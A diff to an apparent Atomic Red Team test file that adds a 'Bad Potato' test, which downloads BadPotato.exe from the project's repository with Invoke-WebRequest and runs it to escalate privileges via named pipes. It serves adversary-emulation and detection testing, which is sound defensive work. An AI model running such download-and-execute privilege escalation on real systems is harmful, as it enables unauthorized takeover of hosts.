@@ -58,3 +58,29 @@ atomic_tests:
      Start-Sleep -Second 5
      Stop-Process -Name "cmd" -force -erroraction silentlycontinue
     name: powershell
+- name: Bad Potato
+  auto_generated_guid: 9c6d799b-c111-4749-a42f-ec2f8cb51448
+  description: |-
+    https://github.com/BeichenDream/BadPotato
+    Privilege escalation using named pipe connections
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies: 
+  - description: |
+      BadPotato.exe must exist in the temp directory
+    prereq_command: |
+      if (Test-Path $env:temp\BadPotato.exe) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest -OutFile $env:TEMP\BadPotato.exe "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true"
+  executor:
+    command: |
+     cd $env:temp
+     Start-Process .\BadPotato.exe notepad.exe
+     Start-Sleep -Second 20
+     Stop-Process -Name "notepad" -force -erroraction silentlycontinue
+     Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
+    cleanup_command: |
+      taskkill /f /im notepad.exe
+    name: powershell
+    elevation_required: true
